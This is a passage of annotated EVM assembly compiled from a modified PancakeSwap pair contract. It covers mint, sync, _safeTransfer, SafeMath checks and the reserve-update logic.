\"src/exchange-protocol/contracts/PancakePair.sol\":7366:7432  require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_300\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e\n      0x28\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_300:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7442:7467  freezeMint(to, liquidity) */\n      tag_301\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7453:7455  to */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7457:7466  liquidity */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7442:7452  freezeMint */\n      tag_293\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7442:7467  freezeMint(to, liquidity) */\n      jump\t// in\n    tag_301:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7478:7527  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7486:7494  balance0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7496:7504  balance1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7506:7515  _reserve0 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7517:7526  _reserve1 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7478:7485  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7478:7527  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_123:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":754:772  uint public taxfee */\n    tag_125:\n      sload(0x0a)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18295:18509  function sync() external lock {... */\n    tag_127:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_306\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_306:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18363:18369  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18389:18393  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18335:18502  _update(... */\n      tag_308\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18363:18369  token0 */\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18380  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18363:18369  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_309\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_309:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_310\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_310:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_311\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_311:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18416:18422  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18442:18446  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18416:18422  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18433  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18416:18422  token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_312\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_312:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_313\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_313:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_314\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_314:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18462:18470  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18484:18492  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18335:18342  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18335:18502  _update(... */\n      jump\t// in\n    tag_308:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18295:18509  function sync() external lock {... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1700:2038  function _safeTransfer(address token, address to, uint value) private {... */\n    tag_142:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":629:663  bytes(\"transfer(address,uint256)\") */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x19\n      dup2\n      mstore\n      0x7472616e7366657228616464726573732c75696e743235362900000000000000\n      0x20\n      swap2\n      dup3\n      add\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1840:1883  abi.encodeWithSelector(SELECTOR, to, value) */\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      0x24\n      dup4\n      add\n      mstore\n      0x44\n      dup1\n      dup4\n      add\n      dup7\n      swap1\n      mstore\n      dup5\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup5\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1840:1883  abi.encodeWithSelector(SELECTOR, to, value) */\n      0x64\n      swap1\n      swap3\n      add\n      dup5\n      mstore\n        /* \"--CODEGEN--\":25:43   */\n      swap2\n      dup2\n      add\n        /* \"--CODEGEN--\":61:78   */\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"--CODEGEN--\":182:197   */\n      and\n      shl(0xe0, 0xa9059cbb)\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":160:209   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      swap3\n      mload\n      dup2\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1781:1793  bool success */\n      0x00\n      swap5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1795:1812  bytes memory data */\n      0x60\n      swap5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1826  token.call */\n      dup10\n      and\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1840:1883  abi.encodeWithSelector(SELECTOR, to, value) */\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      swap2\n      dup3\n      swap2\n        /* \"--CODEGEN--\":25:43   */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      dup1\n      dup4\n        /* \"--CODEGEN--\":25:43   */\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_316:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_318\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_316)\n    tag_318:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_320\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_319)\n        /* \"--CODEGEN--\":16:47   */\n    tag_320:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_319:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1780:1893  (bool success, bytes memory data) = token.call(... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1924:1931  success */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1924:1981  success && (data.length == 0 || abi.decode(data, (bool))) */\n      dup1\n      iszero\n      tag_322\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1947  data.length */\n      dup1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1952  data.length == 0 */\n      iszero\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1980  data.length == 0 || abi.decode(data, (bool)) */\n      tag_322\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1967:1971  data */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1956:1980  abi.decode(data, (bool)) */\n      dup1\n      0x20\n      add\n      swap1\n      mload\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_323\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_323:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1956:1980  abi.decode(data, (bool)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1980  data.length == 0 || abi.decode(data, (bool)) */\n    tag_322:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1903:2031  require(... */\n      tag_324\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x18\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a205452414e534645525f4641494c45440000000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_324:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1700:2038  function _safeTransfer(address token, address to, uint value) private {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":481:630  function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_168:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":539:548  uint256 z */\n      0x00\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":568:574  y == 0 */\n      dup2\n      iszero\n      dup1\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n      tag_326\n      jumpi\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":583:588  x * y */\n      dup1\n      dup3\n      mul\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":597:598  x */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":592:593  y */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":583:588  x * y */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":592:593  y */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":578:593  (z = x * y) / y */\n      tag_327\n      jumpi\n      invalid\n    tag_327:\n      div\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":578:598  (z = x * y) / y == x */\n      eq\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n    tag_326:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":560:623  require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6d756c2d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_170:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2947:3930  function _update(... */\n    tag_179:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3109:3132  balance0 <= uint112(-1) */\n      dup5\n      gt\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3109:3159  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n      tag_332\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3136:3159  balance1 <= uint112(-1) */\n      dup4\n      gt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3109:3159  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n    tag_332:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3088:3202  require(... */\n      tag_333\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x11\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x78, 0x50616e63616b653a204f564552464c4f57)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_333:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3317:3335  blockTimestampLast */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3243:3268  block.timestamp % 2 ** 32 */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3243:3258  block.timestamp */\n      timestamp\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3243:3268  block.timestamp % 2 ** 32 */\n      dup2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3317:3335  blockTimestampLast */\n      swap1\n      div\n      dup2\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3300:3335  blockTimestamp - blockTimestampLast */\n      dup3\n      sub\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3387  timeElapsed > 0 */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3405  timeElapsed > 0 && _reserve0 != 0 */\n      tag_335\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3391:3405  _reserve0 != 0 */\n      dup5\n      and\n      iszero\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3405  timeElapsed > 0 && _reserve0 != 0 */\n    tag_335:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3423  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n      dup1\n      iszero\n      tag_336\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3409:3423  _reserve1 != 0 */\n      dup4\n      and\n      iszero\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3423  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n    tag_336:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3368:3764  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n      iszero\n      tag_337\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3608:3619  timeElapsed */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3539:3619  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      0xffffffff\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3588  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      tag_338\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3578:3587  _reserve0 */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3571  UQ112x112.encode(_reserve1) */\n      tag_339\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3561:3570  _reserve1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3560  UQ112x112.encode */\n      tag_340\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3571  UQ112x112.encode(_reserve1) */\n      jump\t// in\n    tag_339:\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3577  UQ112x112.encode(_reserve1).uqdiv */\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3588  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3577  UQ112x112.encode(_reserve1).uqdiv */\n      tag_341\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3588  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      and\n      jump\t// in\n    tag_338:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3499:3519  price0CumulativeLast */\n      0x0c\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3499:3619  price0CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3539:3589  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3539:3619  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* 